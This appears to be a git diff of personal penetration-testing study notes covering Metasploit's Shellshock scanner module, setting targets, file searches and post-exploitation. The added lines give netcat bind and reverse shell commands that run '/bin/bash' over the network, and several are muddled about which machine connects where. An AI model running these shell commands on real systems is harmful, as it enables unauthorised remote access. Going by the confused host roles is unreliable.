@@ -674,11 +674,13 @@ Module options (auxiliary/scanner/http/apache_mod_cgi_bash_env):
 - `set targeturi /cgi-bin/vulnerable` CGI (Common Gateway Interface) is an interface that enables webservers to execute external programs. The complete path from the root directory in linux is `/usr/lib/cgi-bin/` and by specifying the targeturi we are setting the path to use the exploit module, path where the script file is located
 - `run` or `exploit` after running the above commands
 
+- finding stuff: `find -d -iname *cgi*` , `find -d -iname cgi-bin` , `find . -iname flag`
+
 - Thus in a similar way you can run the exploit instead of auxillary, specify the victim ip, and when you run it it will establish a connection 
 
 ---------------------------------------------------------------------------------------------------------
 
-- below is some repition of above
+> below is some repition of above
 
 You can search by the name of the modules for example after metasploit is loaded (with `search java`, `search shellshock`)
 
@@ -713,11 +715,11 @@ You can search by the name of the modules for example after metasploit is loaded
 - Typically after running the `nmap` scan you will have info regarding the version of filesystem such as samba- then you google for that version to find code for exploitation. 
 - Then you paste that code into metasploit command terminal
 - you can then type `options`
-- `set rhosts <ip address of victim>`
+- `set rhosts <ip address of victim>` I can also use `setg` instead of `set` toset the rhost ip address globally if I am planning on running multiple modules
 - `show targets`
 - `run`
 
-- finding stuff: `find -d -iname *cgi*` , `find -d -iname cgi-bin` , `find . -iname flag`
+
 
 
 
@@ -727,12 +729,17 @@ You can search by the name of the modules for example after metasploit is loaded
 
 ## Post-Exploitation
 
-- Once you are able to break into a victim machine (with exploits you found with search sploit) you can run **Meterpreter** on the target or transfer `payloads`. The goal of the paylod is to establish a shell which intern can be **bind shell** - hacker (port) connects to victim (listener) or **reverse shell** - victim(port) connects to hacker (listener- these port openings are called **backdoor**. This step can be done without metasploit if we use `Ncat`
+- Once you are able to break into a victim machine (which means a successful run of metasploit exploit module or manual running of python etc explot script on the `rhost < victim ip address>` ) you can run **Meterpreter** on the target or transfer `payloads`. The goal of the paylod is to establish a shell which intern can be **bind shell** - A port is opened on victim to which a hacker is able to connect or **reverse shell** - victim(port) connects to hacker to establish a session (These s **backdoor**). This step can be done without metasploit if we use `Ncat`
+
+- After successful exploitation, `nc` or ncat can be used to establish a backdoor
 
 After the exploit is successful, 
 
-- **bind sgell**
- -  `nc -lnvp 4444 -e /bin/bash` This command is run on the hacker's computer, sumultaneously you will have to open a port on the victim as well by using `nc <ip address of victim> 4444`
+- **bind shell**
+
+- Hacker machine:  `nc <ip address of hacker> 4444` on the hacker kali linux machine, this will allow the victim to connect to hacker
+
+ - Victim Machine:  `nc -lnvp 4444 -e /bin/bash` This command is run on the victim's computer (metasploitable machine) to create a listener port
 
        - `-l`: Tells Ncat to listen for incoming connection.
           - `-n`: Indicates that we are listening for numeric IP addresses.
@@ -741,6 +748,15 @@ After the exploit is successful,
          - `-e`: Executes a bash shell, specifically, `/bin/bash`.
 
 
+
+
+- **reverse shell**
+
+- Hacker machine: `nc -lvnp 444`
+- Victim machine: `nc <ip address of victim> -e /bin/bash`
+
+
+**Payload types**
 
 - Payloads are **staged** (the payload is assembled in multiple parts) or **stageless** (all sent at once). A large size payload is likely to fail
 
